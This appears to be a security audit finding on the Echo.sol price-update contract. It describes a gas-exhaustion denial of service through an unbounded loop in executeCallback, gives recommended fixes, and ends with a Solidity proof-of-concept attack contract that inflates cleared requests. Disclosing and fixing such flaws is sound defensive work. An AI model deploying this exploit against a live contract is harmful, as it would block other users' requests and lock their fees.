### Title
Unbounded `while` Loop in `executeCallback` Enables Gas-Exhaustion DoS on Any Price Update Request — (`File: target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.executeCallback` contains an unbounded `while` loop that linearly scans cleared (fulfilled) sequence numbers to advance `_state.firstUnfulfilledSeq`. An unprivileged attacker can register as a provider with zero fees, submit and self-fulfill an arbitrarily large number of requests, and thereby force the loop to perform thousands of cold `SLOAD` operations the next time any `executeCallback` is called. This exhausts the block gas limit and permanently prevents a victim's price update request from ever being fulfilled, locking their fee in the contract.

---

### Finding Description

In `Echo.sol`, after clearing a fulfilled request, `executeCallback` runs the following loop:

```solidity
clearRequest(sequenceNumber);          // line 164

while (
    _state.firstUnfulfilledSeq < _state.currentSequenceNumber &&
    !isActive(findRequest(_state.firstUnfulfilledSeq))
) {
    _state.firstUnfulfilledSeq++;      // lines 169-174
}
``` [1](#0-0) 

Each iteration calls `findRequest(_state.firstUnfulfilledSeq)`, which performs at least one `SLOAD` (2,100 gas cold / 100 gas warm) against either the fixed `requests[32]` array slot or the `requestsOverflow` mapping. [2](#0-1) 

The number of iterations equals the count of consecutively cleared sequence numbers starting from `firstUnfulfilledSeq`. There is no cap on this count. The code itself acknowledges the risk with a `TODO` comment at line 166:

> *"I'm pretty sure this is going to use a lot of gas because it's doing a storage lookup for each sequence number."* [3](#0-2) 

**Attack setup:**

`registerProvider` accepts any address with no validation and allows zero fees:

```solidity
function registerProvider(
    uint96 baseFeeInWei,
    uint96 feePerFeedInWei,
    uint96 feePerGasInWei
) external override {
    ...
    provider.isRegistered = true;
``` [4](#0-3) 

The only mandatory per-request cost is `_state.pythFeeInWei` (set by admin). The attacker sets all three provider fee fields to zero, making each request cost only `pythFeeInWei`.

`requestPriceUpdatesWithCallback` has no rate-limiting or per-address cap on the number of outstanding requests: [5](#0-4) 

The `EchoState` fixed-size array is only 32 slots; overflow goes to an unbounded mapping: [6](#0-5) [7](#0-6) 

---

### Impact Explanation

When the `while` loop exhausts the block gas limit, the entire `executeCallback` transaction reverts — including the preceding `clearRequest`. The victim's request remains active but can never be fulfilled as long as the attacker maintains the gap. The victim's fee is permanently locked in the contract. This is a targeted, sustained Denial-of-Service against any specific price update request.

---

### Likelihood Explanation

The attack is fully permissionless. Any EOA can call `registerProvider` (zero fees), `requestPriceUpdatesWithCallback`, and `executeCallback` without any privileged role. The attacker recovers most of their ETH (all fees minus `pythFeeInWei` per request) by self-fulfilling their own requests. With `pythFeeInWei` set to a small value, the net cost to create N cleared slots is approximately `N × pythFeeInWei` plus gas. At ~2,100 gas per cold SLOAD and a 30M gas block limit, N ≈ 14,000 cleared slots suffices to exhaust the block gas limit in a single `executeCallback` call. The attacker can replenish the gap continuously to sustain the DoS indefinitely.

---

### Recommendation

Replace the unbounded `while` loop with a bounded data structure. The code's own TODO comment suggests a doubly-linked list of active requests. Alternatively:

1. **Bounded scan**: cap the loop at a fixed maximum number of iterations per call (e.g., 64), accepting that `firstUnfulfilledSeq` may lag.
2. **Linked list**: maintain a linked list of active sequence numbers so that advancing the head is O(1).
3. **Lazy pointer**: remove the `firstUnfulfilledSeq` advancement from `executeCallback` entirely and advance it lazily only when needed (e.g., in `getFirstActiveRequests`), which is already a view function and does not affect state-changing operations.

### Proof of Concept

```solidity
// SPDX-License-Identifier: Apache 2
pragma solidity ^0.8.0;

interface IEcho {
    function registerProvider(uint96, uint96, uint96) external;
    function requestPriceUpdatesWithCallback(
        address, uint64, bytes32[] calldata, uint32
    ) external payable returns (uint64);
    function executeCallback(
        address, uint64, bytes[] calldata, bytes32[] calldata
    ) external payable;
}

contract EchoDoSAttack {
    IEcho echo;
    uint64[] seqNums;

    constructor(address _echo) { echo = IEcho(_echo); }

    // Step 1: register as a zero-fee provider
    function setup() external {
        echo.registerProvider(0, 0, 0);
    }

    // Step 2: submit N requests targeting self as provider
    function inflate(uint256 N, bytes32[] calldata priceIds) external payable {
        uint64 publishTime = uint64(block.timestamp);
        for (uint256 i = 0; i < N; i++) {
            uint64 seq = echo.requestPriceUpdatesWithCallback{value: msg.value / N}(
                address(this), publishTime, priceIds, 1
            );
            seqNums.push(seq);
        }
    }

    // Step 3: self-fulfill all N requests (recovering fees)
    function drain(bytes[] calldata updateData, bytes32[] calldata priceIds) external payable {
        for (uint256 i = 0; i < seqNums.length; i++) {
            echo.executeCallback{value: 0}(address(this), seqNums[i], updateData, priceIds);
        }
        // Now firstUnfulfilledSeq is pinned at victim's seq; N cleared slots follow it.
    }

    // Step 4: victim's executeCallback now reverts with out-of-gas
    // because the while loop scans all N cleared slots before reaching victim's active request.
}
```

After `drain()`, any call to `echo.executeCallback(...)` for a request with a sequence number **lower** than the attacker's batch will trigger the `while` loop to scan all N cleared slots. With N ≥ 14,000, the loop exceeds the 30M gas block limit and the victim's request can never be fulfilled.
